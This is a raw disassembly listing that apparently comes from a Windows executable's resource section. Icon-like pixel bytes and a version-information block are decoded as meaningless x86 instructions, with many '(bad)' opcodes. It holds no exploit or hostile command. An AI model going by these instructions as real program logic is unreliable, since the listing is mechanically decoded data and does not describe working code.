  4158d3:	(bad)  
  4158d4:	push   ecx
  4158d6:	out    dx,eax
  4158d7:	(bad)  
  4158d8:	clc    
  4158d9:	aad    0xc8
  4158db:	inc    eax
  4158dd:	mov    bl,0xaf
  4158df:	call   esp
  4158e1:	aam    0xd4
  4158e3:	jmp    DWORD PTR [edi-0x36005e5d]
  4158e9:	mov    bl,0xa8
  4158eb:	(bad)  
  4158ec:	cld    
  4158ed:	(bad)  
  4158ef:	(bad)  
  4158f0:	jmp    esp
  4158f2:	(bad)  
  4158f4:	jmp    ebx
  4158f6:	aad    0xff
  4158f8:	dec    edx
  4158fa:	mov    bl,0xff
  4158fc:	fcmovu st,st(6)
  4158fe:	fdivp  st(7),st
  415900:	fwait
  415901:	popf   
  415902:	mov    al,ds:0x909293ff
  415907:	and    DWORD PTR [eax],eax
  415909:	add    BYTE PTR [eax],al
  41590b:	add    BYTE PTR [ecx-0x4ef66667],bl
  415911:	mov    ah,0xb2
  415913:	push   ecx
  415914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415915:	test   al,0xa9
  415917:	mov    eax,0xffb7b7b6
  41591c:	fcomp  st(0)
  41591e:	fdivr  st,st(7)
  415920:	cld    
  415921:	cld    
  415922:	cld    
  415923:	(bad)  
  415924:	(bad)  
  415925:	(bad)  
  415926:	(bad)  
  415927:	call   eax
  415929:	fsubrp st(3),st
  41592b:	call   FWORD PTR [ebx+ebx*2+0x8cff53]
  415932:	add    bh,bh
  415934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415935:	adc    BYTE PTR [eax],al
  415937:	push   DWORD PTR [edx-0x4000ffe9]
  41593d:	sbb    eax,DWORD PTR [eax]
  41593f:	dec    ebx
  415941:	push   ds
  415942:	add    bh,bh
  415944:	xlat   BYTE PTR ds:[ebx]
  415945:	and    al,0x0
  415947:	jmp    ebx
  415949:	and    BYTE PTR [eax],al
  41594b:	push   eax
  41594d:	push   cs
  41594e:	add    bh,bh
  415950:	push   DWORD PTR [eax-0x7000063]
  415956:	idiv   bh
  415958:	(bad)  
  415959:	(bad)  
  41595b:	push   eax
  41595d:	xlat   BYTE PTR ds:[ebx]
  41595e:	iret   
  41595f:	push   DWORD PTR [ebx-0x42005554]
  415965:	mov    ebp,0xa3adffbd
  41596a:	lahf   
  41596b:	(bad)  
  41596c:	stc    
  41596d:	out    0xe2,eax
  41596f:	(bad)  
  415970:	push   edx
  415972:	in     al,dx
  415973:	(bad)  
  415974:	push   ebx
  415976:	out    dx,al
  415977:	(bad)  
  415978:	(bad)  
  415979:	fadd   st,st(6)
  41597b:	(bad)  
  41597c:	jmp    0xa7413e66
  415981:	lods   al,BYTE PTR ds:[esi]
  415982:	scas   al,BYTE PTR es:[edi]
  415983:	call   DWORD PTR [eax+0x2c8f90]
	...
  415991:	add    BYTE PTR [eax],al
  415993:	add    BYTE PTR [esi+eiz*4-0x5f60fa5a],ah
  41599a:	mov    al,ds:0x91919017
  41599f:	bound  ebx,QWORD PTR [ecx-0x4c476566]
  4159a5:	mov    ah,0xb4
  4159a7:	repz ret 
  4159a9:	iret   
  4159aa:	sar    bh,cl
  4159ac:	sahf   
  4159ad:	jb     0x415a1c
  4159af:	dec    DWORD PTR [ebp-0x57010000]
  4159b5:	adc    eax,DWORD PTR [eax]
  4159b7:	push   DWORD PTR [ebp-0x3e00ffe4]
  4159bd:	push   ds
  4159be:	add    bh,bh
  4159c0:	iret   
  4159c1:	and    BYTE PTR [eax],al
  4159c3:	(bad)  
  4159c4:	(bad)  [esi]
  4159c6:	add    bh,bh
  4159c8:	out    0x18,al
  4159ca:	add    bh,bh
  4159cc:	clc    
  4159cd:	and    al,0x0
  4159cf:	(bad)  
  4159d0:	jmp    edx
  4159d2:	xlat   BYTE PTR ds:[ebx]
  4159d3:	(bad)  
  4159d4:	(bad)  
  4159d5:	(bad)  
  4159d6:	(bad)  
  4159d7:	(bad)  
  4159d8:	(bad)  
  4159d9:	in     eax,dx
  4159da:	jmp    0xec3259de
  4159df:	(bad)  
  4159e0:	out    dx,al
  4159e1:	loop   0x4159bd
  4159e3:	(bad)  
  4159e4:	jmp    0xed4130c7
  4159e9:	fcmovnbe st,st(2)
  4159eb:	(bad)  
  4159ec:	std    
  4159ed:	out    0xdb,al
  4159ef:	(bad)  
  4159f0:	jmp    ebp
  4159f2:	aad    0xff
  4159f4:	(bad)  
  4159f5:	fmul   st(1),st
  4159f7:	(bad)  
  4159f8:	sti    
  4159f9:	mov    ebx,0xe9f3ff9e
  4159fe:	in     al,0xff
  415a00:	mov    cl,0xba
  415a02:	mov    esp,0x8a8b8dff
  415a07:	push   eax
	...
  415a24:	xchg   esi,eax
  415a25:	xchg   esi,eax
  415a26:	xchg   esi,eax
  415a27:	or     al,0xae
  415a29:	mov    dh,0xb9
  415a2b:	lods   al,BYTE PTR ds:[esi]
  415a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a2d:	popf   
  415a2e:	pushf  
  415a2f:	call   DWORD PTR [ecx-0x5200fdfb]
  415a35:	or     BYTE PTR [eax],al
  415a37:	(bad)  
  415a38:	mov    edx,0xc6ff000d
  415a3d:	or     al,BYTE PTR [eax]
  415a3f:	call   esp
  415a41:	or     al,BYTE PTR [eax]
  415a43:	jmp    ebx
  415a45:	or     BYTE PTR [eax],al
  415a47:	(bad)  
  415a48:	out    dx,eax
  415a49:	add    BYTE PTR [eax],al
  415a4b:	(bad)  
  415a4c:	jmp    FWORD PTR [ebx]
  415a4e:	add    bh,bh
  415a50:	(bad)  
  415a51:	fcmovnbe st,st(0)
  415a53:	(bad)  
  415a54:	std    
  415a55:	fxch   st(7)
  415a57:	(bad)  
  415a58:	inc    esi
  415a5a:	mov    ch,0xff
  415a5c:	cli    
  415a5d:	les    esi,FWORD PTR [ecx-0x4f3d0b01]
  415a63:	(bad)  
  415a64:	clc    
  415a65:	shr    DWORD PTR [edi-0x5b440b01],0xff
  415a6c:	out    0xb4,al
  415a6e:	mov    eax,ds:0xacbae0ff
  415a73:	jmp    ebx
  415a75:	lds    edi,FWORD PTR [ecx-0x3b331c01]
  415a7b:	push   ebp
  415a7d:	div    ch
  415a7f:	inc    esp
  415a81:	(bad)  
  415a82:	leave  
  415a83:	call   FWORD PTR [ebp+0x3b9b9c]
	...
  415aa5:	add    BYTE PTR [eax],al
  415aa7:	add    BYTE PTR [edx-0x4e924348],dh
  415aad:	mov    edx,0x85ffbd
  415ab2:	add    bh,bh
  415ab4:	mov    eax,ds:0xb3ff0000
  415ab9:	or     BYTE PTR [ebx],al
  415abb:	(bad)  
  415abc:	mov    eax,0xbfff0b16
  415ac1:	sub    al,0x1a
  415ac3:	dec    esp
  415ac5:	dec    eax
  415ac6:	xor    edi,edi
  415ac8:	(bad)  
  415ac9:	push   edi
  415aca:	inc    ebp
  415acb:	call   ecx
  415acd:	jl     0x415b3a
  415acf:	call   ebp
  415ad1:	scas   al,BYTE PTR es:[edi]
  415ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ad3:	call   ecx
  415ad5:	mov    dl,0xac
  415ad7:	call   eax
  415ad9:	mov    ch,0xaf
  415adb:	dec    eax
  415add:	mov    ebp,0xcac7ffbc
  415ae2:	retf   0xcbff
  415ae5:	rcl    dl,1
  415ae7:	dec    edx
  415ae9:	rcl    esp,1
  415aeb:	dec    ecx
  415aed:	(bad)  
  415aee:	fucompp 
  415af0:	retf   
  415af1:	fchs   
  415af3:	int    0xc7
  415af5:	xlat   BYTE PTR ds:[ebx]
  415af6:	fsub   QWORD PTR [edx-0x70242937]
  415afc:	iret   
  415afd:	rcl    ebx,1
  415aff:	mov    ecx,edx
  415b01:	aam    0xd4
  415b03:	push   ecx
	...
  415b28:	mov    bl,0xb5
  415b2a:	mov    ecx,0xc4bfb664
  415b2f:	call   FWORD PTR [edi-0x5200908d]
  415b35:	xchg   ecx,eax
  415b36:	(bad)  
  415b37:	(bad)  
  415b38:	mov    edx,0xb8ffabad
  415b3d:	mov    ebx,0xceb8ffb8
  415b42:	iret   
  415b43:	(bad)  
  415b44:	mov    esp,0xc1ffe5e0
  415b49:	in     eax,dx
  415b4a:	repz test eax,0xc4dfefe7
  415b51:	xlat   BYTE PTR ds:[ebx]
  415b52:	fidivr DWORD PTR [edi-0x5f252a3c]
  415b58:	(bad)
  415b5b:	test   eax,ecx
  415b5d:	rcl    ebp,1
  415b5f:	jae    0x415b29
  415b61:	int    0xce
  415b63:	push   esp
  415b64:	(bad)  
  415b65:	retf   
  415b66:	int3   
  415b67:	aas    
  415b68:	(bad)  
  415b69:	int3   
  415b6a:	int    0x39
  415b6c:	enter  0xcdca,0x25
  415b70:	(bad)  
  415b71:	leave  
  415b72:	enter  0xc61d,0xc8
  415b76:	leave  
  415b77:	shufps xmm1,xmm0,0xc9
  415b7b:	or     eax,0x4c9c8c3
  415b80:	(bad)  
  415b81:	leave  
  415b82:	retf   
  415b83:	push   es
  415b84:	retf   
  415b85:	iret   
  415b86:	rol    BYTE PTR [edx],cl
	...
  415ba8:	call   0xbdbc:0xba0c9c99
  415baf:	mov    ds:0xbee8e6ce,eax
  415bb4:	enter  0xe3e1,0x96
  415bb8:	leave  
  415bb9:	fstp   st(7)
  415bbb:	imul   ecx,edx,0xffffffdd
  415bbe:	loope  0x415c0f
  415bc0:	retf   
  415bc1:	xlat   BYTE PTR ds:[ebx]
  415bc2:	fidivr DWORD PTR [eax]
  415bc4:	retf   0xd2d1
  415bc7:	cs enter 0xcccd,0x1e
  415bcc:	enter  0xcac9,0xe
	...
  415d08:	(bad)  
  415d09:	(bad)  
  415d0a:	(bad)  
  415d0b:	(bad)  
  415d0c:	(bad)  
  415d0d:	(bad)  
  415d0e:	(bad)  
  415d0f:	(bad)  
  415d10:	(bad)  
  415d11:	inc    BYTE PTR [eax]
  415d13:	(bad)  
  415d14:	(bad)  
  415d15:	cld    
  415d16:	add    BYTE PTR [ebx-0x1],dh
  415d19:	lock add BYTE PTR [ecx],al
  415d1c:	push   eax
  415d1e:	add    BYTE PTR [eax],al
  415d20:	jmp    eax
  415d22:	add    BYTE PTR [eax],al
  415d24:	push   eax
  415d26:	add    BYTE PTR [eax],al
  415d28:	cmp    BYTE PTR [eax],0x0
  415d2b:	add    al,BYTE PTR [eax-0x7ffcfff4]
  415d31:	add    al,BYTE PTR [eax]
  415d33:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d39:	add    BYTE PTR [eax],al
  415d3b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d41:	add    BYTE PTR [eax],al
  415d43:	add    DWORD PTR [eax-0x7fff0000],eax
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    DWORD PTR [eax-0x7fff0000],eax
  415d51:	add    BYTE PTR [eax],al
  415d53:	add    DWORD PTR [eax-0x7fff0000],eax
  415d59:	add    BYTE PTR [eax],al
  415d5b:	add    DWORD PTR [eax-0x80000000],eax
  415d61:	add    BYTE PTR [eax],al
  415d63:	add    BYTE PTR [eax-0x80000000],al
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    al,ah
  415d6d:	add    BYTE PTR [eax],al
  415d6f:	add    dh,bh
  415d71:	add    BYTE PTR [eax],al
  415d73:	add    bh,bh
  415d75:	add    BYTE PTR [eax],al
  415d77:	add    edi,edi
  415d79:	add    BYTE PTR [eax],al
  415d7b:	add    bh,bh
  415d7d:	add    BYTE PTR [edi],bh
  415d7f:	(bad)  
  415d80:	(bad)  
  415d81:	(bad)  
  415d82:	(bad)  
  415d83:	(bad)  
  415d84:	(bad)  
  415d85:	(bad)  
  415d86:	(bad)  
  415d87:	jmp    FWORD PTR [eax]
  415d89:	add    BYTE PTR [eax],al
  415d8b:	add    BYTE PTR [eax],dl
  415d8d:	add    BYTE PTR [eax],al
  415d8f:	add    BYTE PTR [eax],ah
  415d91:	add    BYTE PTR [eax],al
  415d93:	add    BYTE PTR [ecx],al
  415d95:	add    BYTE PTR [eax],ah
  415d97:	add    BYTE PTR [eax],al
  415d99:	add    BYTE PTR [eax],al
  415d9b:	add    BYTE PTR [eax+0x4],al
	...
  415dee:	add    BYTE PTR [eax],al
  415df0:	xchg   ecx,eax
  415df1:	nop
  415df2:	nop
  415df3:	(bad)  
  415df4:	jnp    0x415e6f
  415df6:	jns    0x415df7
  415df8:	xchg   ecx,eax
  415df9:	nop
  415dfa:	nop
  415dfb:	inc    DWORD PTR [eax]
	...
  415e05:	add    BYTE PTR [eax],al
  415e07:	add    BYTE PTR [ebx-0x44004344],bh
  415e0d:	mov    esp,0xb5b4ffbc
  415e12:	mov    ch,0xff
  415e14:	fwait
  415e15:	pushf  
  415e16:	pushf  
  415e17:	call   FWORD PTR [ebx-0x60006364]
  415e1d:	mov    al,ds:0xa0a0ffa0
  415e22:	mov    al,ds:0xff
	...
  415e2f:	add    BYTE PTR [esp+esi*4-0x6b6b2c4c],dh
  415e36:	xchg   esp,eax
  415e37:	call   FWORD PTR [esi+0xcd9e9e]
	...
  415e45:	add    BYTE PTR [eax],al
  415e47:	add    dl,dl
  415e49:	rcl    dl,cl
  415e4b:	or     al,0xc9
  415e4e:	leave  
  415e4f:	inc    esp
  415e51:	mov    dh,0xff
  415e54:	mov    ecx,0xaaffbaba
  415e59:	stos   DWORD PTR es:[edi],eax
  415e5a:	stos   DWORD PTR es:[edi],eax
  415e5b:	jmp    DWORD PTR [eax-0x5f005f60]
  415e61:	mov    al,ds:0x61a0
	...
  415e6e:	add    BYTE PTR [eax],al
  415e70:	stos   DWORD PTR es:[edi],eax
  415e71:	stos   DWORD PTR es:[edi],eax
  415e72:	stos   DWORD PTR es:[edi],eax
  415e73:	idiv   DWORD PTR [edi-0x5a004041]
  415e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7b:	inc    DWORD PTR [eax]
	...
  415e89:	add    BYTE PTR [eax],al
  415e8b:	add    dh,bl
  415e8d:	(bad)  
  415e8f:	ss mov ecx,0x8affbaba
  415e95:	mov    cl,BYTE PTR [edx-0x68686801]
  415e9b:	in     al,dx
  415e9c:	mov    al,ds:0x36a0a0
	...
  415ead:	add    BYTE PTR [eax],al
  415eaf:	add    BYTE PTR [esi-0x2e085152],ch
  415eb5:	rcl    ecx,1
  415eb7:	jmp    FWORD PTR [ebx-0x3c005455]
  415ebd:	(bad)  
  415ebe:	les    eax,FWORD PTR [esi-0x3e3e40]
  415ec4:	mov    esi,0xbbffbfbf
  415ec9:	mov    esp,0xb9b8ffbc
  415ece:	mov    ecx,0xb6b6b5ff
  415ed3:	jmp    FWORD PTR [edx-0x57005556]
  415ed9:	test   al,0xa8
  415edb:	jmp    DWORD PTR [esi-0x5b00595a]
  415ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee3:	jmp    DWORD PTR [edx-0x5f005d5e]
  415ee9:	mov    al,ds:0xa0a0ffa0
  415eee:	mov    al,ds:0xadadad95
  415ef3:	not    ecx
  415ef5:	rcl    ecx,1
  415ef7:	jmp    FWORD PTR [ebx-0x32005455]
  415efd:	iret   
  415efe:	iret   
  415eff:	dec    ebp
  415f01:	iret   
  415f02:	iret   
  415f03:	dec    ebp
  415f05:	into   
  415f06:	iret   
  415f07:	dec    esp
  415f09:	into   
  415f0a:	into   
  415f0b:	dec    ebx
  415f0d:	int    0xcd
  415f0f:	dec    edx
  415f11:	int3   
  415f12:	int3   
  415f13:	inc    edi
  415f15:	leave  
  415f16:	leave  
  415f17:	inc    esi
  415f19:	leave  
  415f1a:	leave  
  415f1b:	inc    esi
  415f1d:	leave  
  415f1e:	leave  
  415f1f:	inc    ebp
  415f21:	enter  0xffc8,0xc5
  415f25:	enter  0xffc8,0xc4
  415f29:	mov    edi,0xa0a0a0ff
  415f2f:	jmp    FWORD PTR [ebp-0x2e085253]
  415f35:	rcl    ecx,1
  415f37:	jmp    FWORD PTR [ebx-0x31005455]
  415f3d:	rcl    al,1
  415f3f:	jmp    FWORD PTR [ebp-0x58005152]
  415f45:	(bad)  
  415f46:	ud0    ebp,DWORD PTR [ebx-0x5700f2ed]
  415f4d:	push   cs
  415f4e:	push   cs
  415f4f:	jmp    FWORD PTR [ecx-0x4b00dfe0]
  415f55:	aas    
  415f56:	das    
  415f57:	call   esp
  415f59:	sbb    eax,DWORD PTR [ecx]
  415f5b:	call   esp
  415f5d:	sbb    eax,0x1dd8ff01
  415f62:	add    bh,bh
  415f64:	retf   
  415f65:	and    eax,0xc8c5ff03
  415f6a:	enter  0xa1ff,0xa1
  415f6e:	mov    eax,ds:0xaeaeaeff
  415f73:	not    ecx
  415f75:	rcl    ecx,1
  415f77:	jmp    FWORD PTR [esp+ebp*4-0x2e300054]
  415f7e:	sar    edi,1
  415f80:	stos   DWORD PTR es:[edi],eax
  415f81:	lods   al,BYTE PTR ds:[esi]
  415f82:	lods   al,BYTE PTR ds:[esi]
  415f83:	push   DWORD PTR [edx-0x4c00dcd4]
  415f89:	xor    DWORD PTR [edx],esp
  415f8b:	(bad)  
  415f8c:	mov    ecx,0xc9ff0c1d
  415f91:	(bad)
  415f94:	int3   
  415f95:	jno    0x415ffa
  415f97:	call   edi
  415f99:	inc    edi
  415f9a:	sub    al,0xff
  415f9c:	fiadd  WORD PTR [eax+0x25]
  415f9f:	jmp    ebx
  415fa1:	inc    esp
  415fa2:	daa    
  415fa3:	(bad)  
  415fa4:	fnstsw WORD PTR [ebx]
  415fa6:	adc    bh,bh
  415fa8:	(bad)  
  415fa9:	mov    edi,0xa3a3a3ff
  415faf:	call   DWORD PTR [esi+0xf7a3bd]
  415fb5:	repnz dec eax
  415fb7:	jmp    DWORD PTR [edx-0x3e]
  415fba:	cmp    bh,0xcf
  415fbd:	rcl    ecx,1
  415fbf:	jmp    FWORD PTR [ecx-0x4b005657]
  415fc5:	inc    eax
  415fc6:	xor    eax,0x222fb4ff
  415fcb:	call   edi
  415fcd:	(bad)  
  415fce:	aad    0xff
  415fd0:	out    dx,al
  415fd1:	out    dx,al
  415fd2:	out    dx,al
  415fd3:	(bad)  
  415fd4:	clc    
  415fd5:	clc    
  415fd6:	clc    
  415fd7:	push   DWORD PTR [ebx-0x24007873]
  415fdd:	pop    eax
  415fde:	cmp    edi,edi
  415fe0:	fstp   QWORD PTR [ecx+eax*2-0x1]
  415fe4:	fimul  WORD PTR [edi+0x2d]
  415fe7:	inc    ebp
  415fe9:	enter  0xffc8,0xa5
  415fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fef:	jmp    FWORD PTR [ebx+0x48f7abab]
  415ff5:	inc    esp
  415ff6:	inc    ebx
  415ff7:	(bad)  
  415ff8:	jnp    0x416073
  415ffa:	jns    0x415ffb
  415ffc:	rcl    edx,1
  415ffe:	sar    bh,cl
  416000:	mov    ds:0xb8ffa3a3,eax
  416005:	inc    ebx
  416006:	cmp    bh,bh
  416008:	rol    BYTE PTR [ecx+0x34],0xff
  41600c:	fmul   st(2),st
  41600e:	leave  
  41600f:	(bad)  
  416010:	fcomp  DWORD PTR [edx]
  416012:	add    bh,bh
  416014:	aam    0x82
  416016:	jne    0x416017
  416018:	(bad)  
  416019:	(bad)  
  41601a:	(bad)  
  41601b:	call   esi
  41601d:	push   0x53
  41601f:	call   ebp
  416021:	ins    BYTE PTR es:[edi],dx
  416022:	pop    ecx
  416023:	(bad)  
  416024:	fisub  DWORD PTR [edx+0x48]
  416027:	inc    edi
  416029:	retf   0xffca
  41602c:	stos   DWORD PTR es:[edi],eax
  41602d:	stos   DWORD PTR es:[edi],eax
  41602e:	stos   DWORD PTR es:[edi],eax
  41602f:	(bad)  
  416030:	mov    esi,0xbe94bebe
  416035:	mov    esi,0xbebeffbe
  41603a:	mov    esi,0xd2d2d0c0
  41603f:	jmp    DWORD PTR [edx-0x43005d5e]
  416045:	das    
  416046:	and    al,0xff
  416048:	lds    ebx,FWORD PTR [ecx+ecx*1]
  41604b:	(bad)  
  41604c:	ficomp DWORD PTR [esi]
  41604e:	add    bh,bh
  416050:	out    0x1b,al
  416052:	add    bh,bh
  416054:	call   FWORD PTR [ecx+0x36]
  416057:	push   ebx
  416059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605a:	nop
  41605b:	(bad)  
  41605c:	(bad)  
  41605e:	fcos   
  416060:	jmp    FWORD PTR [edx+0x3c]
  416063:	(bad)  
  416064:	jmp    DWORD PTR [ebp+0x31]
  416067:	inc    edi
  416069:	retf   0xffca
  41606c:	lods   eax,DWORD PTR ds:[esi]
  41606d:	scas   al,BYTE PTR es:[edi]
  41606e:	scas   al,BYTE PTR es:[edi]
  41606f:	inc    DWORD PTR [eax]
	...
  416079:	add    BYTE PTR [eax],al
  41607b:	add    cl,dl
  41607d:	rcl    bl,cl
  41607f:	jmp    DWORD PTR [eax-0x3a005f60]
  416085:	sbb    BYTE PTR [edi],al
  416087:	call   esp
  416089:	sbb    BYTE PTR [ecx],al
  41608b:	jmp    ebx
  41608d:	es add bh,bh
  416090:	in     eax,dx
  416091:	sbb    al,BYTE PTR [eax]
  416093:	(bad)  
  416094:	push   DWORD PTR [eax+0x4b]
  416097:	(bad)  
  416098:	jmp    FWORD PTR [ebx+0x48]
  41609b:	jmp    ecx
  41609d:	loope  0x416080
  41609f:	inc    eax
  4160a1:	mov    edx,0x6bffffb8
  4160a6:	aas    
  4160a7:	dec    eax
  4160a9:	retf   0xffcb
  4160ac:	mov    al,0xb1
  4160ae:	mov    cl,0xff
	...
  4160bc:	rcl    edx,1
  4160be:	sar    edi,cl
  4160c0:	mov    al,ds:0xcaffa0a0
  4160c5:	add    al,0x4
  4160c7:	(bad)  
  4160c8:	fmul   QWORD PTR [edi]
  4160ca:	add    bh,bh
  4160cc:	call   0xf84060e3
  4160d1:	push   ss
  4160d2:	add    bh,bh
  4160d4:	(bad)  
  4160d5:	jg     0x416113
  4160d7:	call   esi
  4160d9:	sbb    BYTE PTR [edi+edi*8-0x29],0x83
  4160de:	pop    ecx
  4160df:	(bad)  
  4160e0:	fiadd  DWORD PTR [ecx+0x73dfff51]
  4160e6:	inc    ebx
  4160e7:	dec    ecx
  4160e9:	retf   
  4160ea:	retf   
  4160eb:	push   DWORD PTR [edx+0xffb3b3]
	...
  4160f9:	add    BYTE PTR [eax],al
  4160fb:	add    cl,dl
  4160fd:	rcl    bl,cl
  4160ff:	jmp    DWORD PTR [eax-0x5f005f60]
  416105:	mov    al,ds:0xa0a0ffa0
  41610a:	mov    al,ds:0xa2a2a2ff
  41610f:	jmp    DWORD PTR [esp+eiz*4-0x5152005c]
  416116:	scas   al,BYTE PTR es:[edi]
  416117:	push   DWORD PTR [eax-0x4d004f50]
  41611d:	mov    bl,0xb3
  41611f:	push   DWORD PTR [ebp-0x4700494a]
  416125:	mov    ecx,0xcbc9ffb9
  41612a:	int3   
  41612b:	push   DWORD PTR [ebp+0xffb6b6]
	...
  416139:	add    BYTE PTR [eax],al
  41613b:	add    cl,dl
  41613d:	rcl    bl,cl
  41613f:	js     0x416112
  416141:	rcl    bl,cl
  416143:	call   ecx
  416145:	rcl    bl,cl
  416147:	call   ecx
  416149:	rcl    bl,cl
  41614b:	call   eax
  41614d:	rcl    dl,cl
  41614f:	call   eax
  416151:	rcl    edx,1
  416153:	dec    esi
  416155:	rcl    al,1
  416157:	dec    ebp
  416159:	iret   
  41615a:	iret   
  41615b:	dec    ebp
  41615d:	iret   
  41615e:	iret   
  41615f:	dec    esp
  416161:	into   
  416162:	into   
  416163:	dec    ebx
  416165:	int    0xcd
  416167:	dec    edx
  416169:	int3   
  41616a:	int3   
  41616b:	(bad)  
  41616c:	mov    eax,0x95b9b9
	...
  4161ad:	add    BYTE PTR [eax],al
  4161af:	add    bh,bh
  4161b1:	inc    DWORD PTR [eax]
  4161b3:	add    BYTE PTR [edi+eax*1],bl
  4161b6:	add    BYTE PTR [eax],al
  4161b8:	sbb    al,0x7
  4161ba:	add    BYTE PTR [eax],al
  4161bc:	push   ds
  4161bd:	sldt   WORD PTR [eax]
	...
  4161dc:	loopne 0x4161de
  4161de:	add    BYTE PTR [eax],al
  4161e0:	loopne 0x4161e2
  4161e2:	add    BYTE PTR [eax],al
  4161e4:	loopne 0x4161e6
  4161e6:	add    BYTE PTR [eax],al
  4161e8:	loopne 0x4161ea
  4161ea:	add    BYTE PTR [eax],al
  4161ec:	(bad)  
  4161ed:	inc    DWORD PTR [eax]
  4161ef:	add    BYTE PTR [eax],al
  4161f1:	add    BYTE PTR [ecx],al
  4161f3:	add    BYTE PTR [edx],cl
  4161f5:	add    BYTE PTR [eax],dh
  4161f7:	xor    BYTE PTR [eax],dl
  4161f9:	add    BYTE PTR [ecx],al
  4161fb:	add    BYTE PTR [eax+eax*1],al
  4161fe:	push   0x1000006
  416203:	add    BYTE PTR [eax],ah
  416205:	and    BYTE PTR [eax],dl
  416207:	add    BYTE PTR [ecx],al
  416209:	add    BYTE PTR [eax+eax*1],al
  41620c:	call   0x2416213
  416211:	add    BYTE PTR [eax],dl
  416213:	adc    BYTE PTR [eax],dl
  416215:	add    BYTE PTR [ecx],al
  416217:	add    BYTE PTR [eax+eax*1],al
  41621a:	sub    BYTE PTR [ecx],al
  41621c:	add    BYTE PTR [eax],al
  41621e:	add    eax,DWORD PTR [eax]
  416220:	xor    BYTE PTR [eax],dh
  416222:	add    BYTE PTR [eax],al
  416224:	add    DWORD PTR [eax],eax
  416226:	or     BYTE PTR [eax],al
  416228:	test   al,0xe
  41622a:	add    BYTE PTR [eax],al
  41622c:	add    al,0x0
  41622e:	and    BYTE PTR [eax],ah
  416230:	add    BYTE PTR [eax],al
  416232:	add    DWORD PTR [eax],eax
  416234:	or     BYTE PTR [eax],al
  416236:	test   al,0x8
  416238:	add    BYTE PTR [eax],al
  41623a:	add    eax,0x101000
  41623f:	add    BYTE PTR [ecx],al
  416241:	add    BYTE PTR [eax],cl
  416243:	add    BYTE PTR [eax+0x5],ch
  416246:	add    BYTE PTR [eax],al
  416248:	push   es
  416249:	add    BYTE PTR [eax],al
  41624b:	add    BYTE PTR [eax],al
  41624d:	add    BYTE PTR [ecx],al
  41624f:	add    BYTE PTR [eax],ah
  416251:	add    al,ch
  416253:	mov    bh,0x0
  416255:	add    BYTE PTR [edi],al
  416257:	add    BYTE PTR [eax],dh
  416259:	xor    BYTE PTR [eax],al
  41625b:	add    BYTE PTR [ecx],al
  41625d:	add    BYTE PTR [eax],ah
  41625f:	add    BYTE PTR [eax+0x8000025],ch
  416265:	add    BYTE PTR [eax],ah
  416267:	and    BYTE PTR [eax],al
  416269:	add    BYTE PTR [ecx],al
  41626b:	add    BYTE PTR [eax],ah
  41626d:	add    BYTE PTR [eax+0x9000010],ch
  416273:	add    BYTE PTR [eax],dl
  416275:	adc    BYTE PTR [eax],al
  416277:	add    BYTE PTR [ecx],al
  416279:	add    BYTE PTR [eax],ah
  41627b:	add    BYTE PTR [eax+0x4],ch
  41627e:	add    BYTE PTR [eax],al
  416280:	or     al,BYTE PTR [eax]
  416282:	add    BYTE PTR [eax],al
  416284:	add    BYTE PTR [eax],al
  416286:	add    BYTE PTR [eax],al
  416288:	call   0x419690
  41628d:	add    BYTE PTR [esi+0x0],dl
  416290:	push   ebx
  416291:	add    BYTE PTR [edi+0x0],bl
  416294:	push   esi
  416295:	add    BYTE PTR [ebp+0x0],al
  416298:	push   edx
  416299:	add    BYTE PTR [ebx+0x0],dl
  41629c:	dec    ecx
  41629d:	add    BYTE PTR [edi+0x0],cl
  4162a0:	dec    esi
  4162a1:	add    BYTE PTR [edi+0x0],bl
  4162a4:	dec    ecx
  4162a5:	add    BYTE PTR [esi+0x0],cl
  4162a8:	inc    esi
  4162a9:	add    BYTE PTR [edi+0x0],cl
  4162ac:	add    BYTE PTR [eax],al
  4162ae:	add    BYTE PTR [eax],al
  4162b0:	mov    ebp,0xfeef04
  4162b5:	add    BYTE PTR [ecx],al
  4162b7:	add    BYTE PTR [eax],al
  4162b9:	add    BYTE PTR [edx],cl
  4162bb:	add    BYTE PTR [eax],al
  4162bd:	inc    eax
  4162be:	add    BYTE PTR [eax],ch
  4162c0:	add    BYTE PTR [eax],al
  4162c2:	or     al,BYTE PTR [eax]
  4162c4:	add    BYTE PTR [eax+0x0],al
  4162c7:	sub    BYTE PTR [edi],bh
  4162c9:	add    BYTE PTR [eax],al
  4162cb:	add    BYTE PTR [eax],al
  4162cd:	add    BYTE PTR [eax],al
  4162cf:	add    BYTE PTR [eax+eax*1],al
  4162d2:	add    al,0x0
  4162d4:	add    DWORD PTR [eax],eax
	...
  4162e2:	add    BYTE PTR [eax],al
  4162e4:	inc    esi
  4162e5:	add    eax,DWORD PTR [eax]
  4162e7:	add    BYTE PTR [ecx],al
  4162e9:	add    BYTE PTR [ebx+0x0],dl
  4162ec:	je     0x4162ee
  4162ee:	jb     0x4162f0
  4162f0:	imul   eax,DWORD PTR [eax],0x67006e
  4162f6:	inc    esi
  4162f7:	add    BYTE PTR [ecx+0x0],ch
  4162fa:	ins    BYTE PTR es:[edi],dx
  4162fb:	add    BYTE PTR [ebp+0x0],ah
  4162fe:	dec    ecx
  4162ff:	add    BYTE PTR [esi+0x0],ch
  416302:	data16 add BYTE PTR [edi+0x0],ch
  416306:	add    BYTE PTR [eax],al
  416308:	and    al,BYTE PTR [ebx]
  41630a:	add    BYTE PTR [eax],al
  41630c:	add    DWORD PTR [eax],eax
  41630e:	xor    BYTE PTR [eax],al
  416310:	xor    al,0x0
  416312:	xor    BYTE PTR [eax],al
  416314:	cmp    DWORD PTR [eax],eax
